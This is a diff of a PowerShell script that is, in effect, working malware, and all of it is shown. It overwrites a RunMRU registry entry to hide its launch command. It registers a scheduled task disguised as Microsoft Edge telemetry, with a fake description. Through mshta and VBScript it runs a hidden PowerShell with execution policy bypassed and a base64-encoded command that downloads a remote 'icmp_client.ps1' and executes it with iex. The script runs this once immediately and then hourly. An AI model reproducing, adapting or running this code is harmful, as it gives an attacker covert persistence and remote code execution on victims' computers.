@@ -1,12 +1,15 @@
 $property_name = (Get-ItemProperty "Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "MRUList").MRUList.SubString(0,1)
 Set-ItemProperty "Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name $property_name -Value "%appdata%"
+
 if(Get-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -ErrorAction SilentlyContinue) {
     Unregister-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -Confirm:$false > $null
 }
+
 $ac = New-ScheduledTaskAction -Execute 'C:\Windows\System32\mshta.exe' -Argument 'vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -w h -nol -noni -ep bypass -enc aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAEMAbABpAGMAawBlAHMAdAAvAGEALwBtAGEAcwB0AGUAcgAvAGkAYwBtAHAAXwBjAGwAaQBlAG4AdAAuAHAAcwAxAHwAaQBlAHgA"", 0 : window.close")'
 $st = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -DontStopOnIdleEnd -DontStopIfGoingOnBatteries -RunOnlyIfIdle -IdleDuration 00:01:00 -IdleWaitTimeout 01:00:00
 $tr = New-ScheduledTaskTrigger -Daily -At 00:00
 $tr2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 1)
 $tr.Repetition = $tr2.Repetition
 Register-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -Description "This task initiates the background task for Microsoft Edge Telemetry Agent, which scans and uploads basic usage and error information for Microsoft Edge solution." -Action $ac -Settings $st -Trigger $tr > $null
+
 powershell -w h -nol -noni -ep bypass -enc aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAEMAbABpAGMAawBlAHMAdAAvAGEALwBtAGEAcwB0AGUAcgAvAGkAYwBtAHAAXwBjAGwAaQBlAG4AdAAuAHAAcwAxAHwAaQBlAHgA
